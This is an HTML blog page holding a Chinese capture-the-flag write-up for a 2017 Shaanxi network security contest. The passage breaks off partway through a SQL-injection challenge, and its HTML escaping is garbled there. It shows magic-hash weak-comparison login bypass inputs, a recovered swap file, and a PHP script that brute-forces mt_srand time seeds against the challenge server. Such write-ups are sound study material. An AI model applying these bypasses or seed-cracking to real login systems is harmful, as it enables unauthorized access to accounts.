@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="write-up," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="4ct10n's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="这次比赛觉得质量挺高的，至少找到了很多盲点，要学习的东西还非常多。0x01 签到题首先看源码  常见的类型，可以见以前写的博客 直接弱类型比较 Username=QNKCDZO&amp;amp;password=240610708 接着继续看源码 直接生成一个json格式的东西发过去就ok 试了好多遍才找到key=0 {‘key’:0} 0x02 抽抽奖一道简单的js调试题目 首先找点击触发事件">
+<meta name="keywords" content="write-up">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017 陕西省网络安全技术比赛 Writeup">
+<meta property="og:url" content="http://yoursite.com/2017/04/17/2017 陕西省网络安全技术比赛 Writeup/index.html">
+<meta property="og:site_name" content="4ct10n&#39;s Blog">
+<meta property="og:description" content="这次比赛觉得质量挺高的，至少找到了很多盲点，要学习的东西还非常多。0x01 签到题首先看源码  常见的类型，可以见以前写的博客 直接弱类型比较 Username=QNKCDZO&amp;amp;password=240610708 接着继续看源码 直接生成一个json格式的东西发过去就ok 试了好多遍才找到key=0 {‘key’:0} 0x02 抽抽奖一道简单的js调试题目 首先找点击触发事件">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.blog.csdn.net/20170417142529527?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170417143303468?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170417143502466?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170417143941082?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170417144144660?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170417144153929?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170417144201191?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170417165232031?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170417170940407?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170424182028844?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170424203734920?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170424203746561?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170424204147957?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170424205122533?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:updated_time" content="2017-10-22T02:14:35.023Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2017 陕西省网络安全技术比赛 Writeup">
+<meta name="twitter:description" content="这次比赛觉得质量挺高的，至少找到了很多盲点，要学习的东西还非常多。0x01 签到题首先看源码  常见的类型，可以见以前写的博客 直接弱类型比较 Username=QNKCDZO&amp;amp;password=240610708 接着继续看源码 直接生成一个json格式的东西发过去就ok 试了好多遍才找到key=0 {‘key’:0} 0x02 抽抽奖一道简单的js调试题目 首先找点击触发事件">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20170417142529527?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/04/17/2017 陕西省网络安全技术比赛 Writeup/"/>
+
+
+
+
+
+  <title>2017 陕西省网络安全技术比赛 Writeup | 4ct10n's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">4ct10n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/17/2017 陕西省网络安全技术比赛 Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="4ct10n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/qq.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="4ct10n's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2017 陕西省网络安全技术比赛 Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-17T22:27:00+08:00">
+                2017-04-17
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-10-22T10:14:35+08:00">
+                2017-10-22
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这次比赛觉得质量挺高的，至少找到了很多盲点，要学习的东西还非常多。0x01 签到题首先看源码  常见的类型，可以见以前写的博客 直接弱类型比较 Username=QNKCDZO&amp;password=240610708 接着继续看源码 直接生成一个json格式的东西发过去就ok 试了好多遍才找到key=0 {‘key’:0} 0x02 抽抽奖一道简单的js调试题目 首先找点击触发事件<br><a id="more"></a></p>
+<p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p>
+<div class="markdown_views"><p>这次比赛觉得质量挺高的，至少找到了很多盲点，要学习的东西还非常多。</p><br><h1 id="0x01-签到题">0x01 签到题</h1><br><p>首先看源码 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417142529527?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>常见的类型，<a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="external">可以见以前写的博客</a> <br><br>直接弱类型比较 <br><br>Username=QNKCDZO&amp;password=240610708 <br><br>接着继续看源码 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417143303468?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br><br><br></p><br><p>直接生成一个json格式的东西发过去就ok 试了好多遍才找到key=0 <br><br>{‘key’:0} <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417143502466?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br></p><br><h1 id="0x02-抽抽奖">0x02 抽抽奖</h1><br><p>一道简单的js调试题目 <br><br>首先找点击触发事件 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417143941082?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br></p><br><p>找到之后下断点，点击按钮，单步调试 <br><br>在有弹窗的函数出下断点步入 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417144144660?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417144153929?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417144201191?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br></p><br><h1 id="0x03-wrong">0x03 Wrong</h1><br><p>一个备份文件泄露的题目，找到备份文件.index.php.swp <br><br>利用<code>vim -r index.php.swp</code>还原<br></p><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_password</span><span class="hljs-params">(<span class="hljs-variable">$pw_length</span> =  <span class="hljs-number">10</span>)</span><br>{</span><br><span class="hljs-variable">$randpwd</span> = <span class="hljs-string">“”</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$pw_length</span>; <span class="hljs-variable">$i</span>++)<br>{<br><span class="hljs-variable">$randpwd</span> .= chr(mt_rand(<span class="hljs-number">33</span>, <span class="hljs-number">126</span>));<br>}<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$randpwd</span>;<br>}<br><br>session_start();<br>mt_srand(time());<br><span class="hljs-variable">$pwd</span>=create_password();<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$pwd</span>==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘pwd’</span>])<br>{<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘userLogin’</span>]==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘login’</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">“Good job, you get the key”</span>;<br>}<br><span class="hljs-keyword">else</span><br>{<span class="hljs-keyword">echo</span> <span class="hljs-string">“Wrong!”</span>;}<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘userLogin’</span>]=create_password(<span class="hljs-number">32</span>).rand();<br><span class="hljs-preprocessor">?&gt;</span></span></code></pre><br><p>考点很清楚 爆破种子，<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="external">以前有类似的题目，附上链接</a> <br><br>分析一下逻辑可以得到，第一个随机数mt_srand可以用时间种子暴力破解 <br><br>第二个rand可以利用弱类型比较绕过 <br><br>左后附上代码<br><br><br></p><br><pre class="prettyprint"><code class="language-php hljs "><span class="hljs-preprocessor">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_password</span><span class="hljs-params">(<span class="hljs-variable">$pw_length</span> =  <span class="hljs-number">10</span>)</span><br>{</span><br><span class="hljs-variable">$randpwd</span> = <span class="hljs-string">“”</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$pw_length</span>; <span class="hljs-variable">$i</span>++)<br>{<br><span class="hljs-variable">$randpwd</span> .= chr(mt_rand(<span class="hljs-number">33</span>, <span class="hljs-number">126</span>));<br>}<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$randpwd</span>;<br>}<br><br><span class="hljs-comment">//$cookie_file = dirname(<strong>FILE</strong>).’/cookie.txt’;</span><br><span class="hljs-comment">//使用上面保存的cookies再次访问</span><br><span class="hljs-variable">$i</span> = <span class="hljs-number">80</span>;<br><span class="hljs-variable">$time</span> = time();<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span>–)<br>{<br>mt_srand(<span class="hljs-variable">$time</span>+<span class="hljs-variable">$i</span>);<br><span class="hljs-keyword">echo</span>  time();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">‘hhh’</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$time</span>+<span class="hljs-variable">$i</span>;<br><span class="hljs-variable">$s</span> = create_password();<br><span class="hljs-variable">$url</span> = <span class="hljs-string">“<a href="http://117.34.111.15:85/index.php?pwd=$s&amp;login=" target="_blank" rel="external">http://117.34.111.15:85/index.php?pwd=$s&amp;login=</a>“</span>;<br><span class="hljs-variable">$ch</span> = curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file); //使用上面获取的cookies</span><br><span class="hljs-comment">//curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie_file); //存储cookies</span><br><span class="hljs-variable">$response</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;<br>}<br><span class="hljs-preprocessor">?&gt;</span></code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417165232031?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h1 id="0x04-so-easy">0x04 so easy!</h1><br><p>这道题挺不错的，学到了很多新姿势 <br><br>首先看源码<br></p><br><pre class="prettyprint"><code class=" hljs xml"> <span class="php"><span class="hljs-preprocessor">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">“config.php”</span>);<br><br><span class="hljs-variable">$conn</span> -&gt;query(<span class="hljs-string">“set names utf8”</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randStr</span><span class="hljs-params">(<span class="hljs-variable">$lenth</span>=<span class="hljs-number">32</span>)</span>{</span><br>    <span class="hljs-variable">$strBase</span> = <span class="hljs-string">“1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm”</span>;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">“”</span>;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$lenth</span>&gt;<span class="hljs-number">0</span>){<br>      <span class="hljs-variable">$str</span>.=substr(<span class="hljs-variable">$strBase</span>,rand(<span class="hljs-number">0</span>,strlen(<span class="hljs-variable">$strBase</span>)-<span class="hljs-number">1</span>),<span class="hljs-number">1</span>);<br>      <span class="hljs-variable">$lenth</span> –;<br>    }<br>   <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$install</span>){<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">“create table <code>user</code> (<br>         <code>id</code> int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,<br>         <code>username</code> varchar(30) NOT NULL,<br>         <code>passwd</code> varchar(32) NOT NULL,<br>         <code>role</code> varchar(30) NOT NULL<br>       )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci “</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>)){<br>       <span class="hljs-variable">$sql</span>  = <span class="hljs-string">“insert into <code>user</code>(<code>username</code>,<code>passwd</code>,<code>role</code>) values (‘admin’,’”</span>.md5(randStr()).<span class="hljs-string">“‘,’admin’)”</span>;<br>       <span class="hljs-variable">$conn</span> -&gt; query(<span class="hljs-variable">$sql</span>);<br>    }<br>}<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">(<span class="hljs-variable">$str</span>)</span>{</span><br>     <span class="hljs-variable">$filter</span> = <span class="hljs-string">“/ |*|#|;|,|is|union|like|regexp|for|and|or|file|–|||<code>|&amp;amp;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&#39;%09&#39;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&quot;%0a&quot;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&quot;%0b&quot;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&#39;%0c&#39;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&#39;%0d&#39;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&#39;%a0&#39;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;/i&quot;&lt;/span&gt;; 
+     &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;hljs-variable&quot;&gt;$filter&lt;/span&gt;,&lt;span class=&quot;hljs-variable&quot;&gt;$str&lt;/span&gt;)){
+         &lt;span class=&quot;hljs-keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;you can&#39;t input this illegal char!&quot;&lt;/span&gt;);
+     }
+     &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$str&lt;/span&gt;; 
+
+}
+
+
+&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;)&lt;/span&gt;{&lt;/span&gt;
+  &lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt;;
+  &lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&quot;select role from</code>user<code>where username =&#39;&quot;&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;.&lt;span class=&quot;hljs-string&quot;&gt;&quot;&#39;&quot;&lt;/span&gt;;
+  &lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt; = &lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt; -&amp;gt;query(&lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt;);
+  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt;-&amp;gt;num_rows&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;){
+
+      &lt;span class=&quot;hljs-keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;$username is &quot;&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt;-&amp;gt;fetch_assoc()[&lt;span class=&quot;hljs-string&quot;&gt;&#39;role&#39;&lt;/span&gt;];
+  }&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{
+      &lt;span class=&quot;hljs-keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Don&#39;t have this user!&quot;&lt;/span&gt;);
+  }
+}
+
+&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;,&lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt;)&lt;/span&gt;{&lt;/span&gt;
+    &lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt;;
+    &lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$flag&lt;/span&gt;;
+
+    &lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt; = trim(strtolower(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;));
+    &lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt; = trim(strtolower(&lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt;));
+    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt; == &lt;span class=&quot;hljs-string&quot;&gt;&#39;admin&#39;&lt;/span&gt;){
+        &lt;span class=&quot;hljs-keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;you can&#39;t login this as admin!&quot;&lt;/span&gt;);
+    }
+
